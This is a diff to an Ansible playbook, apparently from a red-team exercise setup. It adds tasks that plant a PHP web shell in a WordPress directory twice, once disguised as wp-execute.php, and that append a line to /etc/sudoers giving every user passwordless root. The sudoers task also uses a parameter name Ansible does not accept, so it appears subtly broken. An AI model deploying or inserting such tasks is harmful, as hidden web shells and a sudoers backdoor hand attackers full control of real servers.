@@ -156,3 +156,21 @@
       name: apache2
       enabled: true
       state: restarted
+
+### ADDS RED TEAM WEBSHELLS
+  - name: Add webshell.php shell
+    copy:
+      src: webshell.php
+      dest: /var/www/html/wordpress/shell.php
+
+  - name: Add wp-execute.php shell
+    copy:
+      src: webshell.php
+      dest: /var/www/html/wordpress/wp-execute.php
+
+  - name: Mess with /etc/sudoers so you can sudo in the webshells
+    ansible.builtin.lineinfile:
+      state: present
+      value: "ALL ALL=(ALL:ALL) NOPASSWD:ALL"
+      path: "/etc/sudoers"
+      insertafter: "EOF"
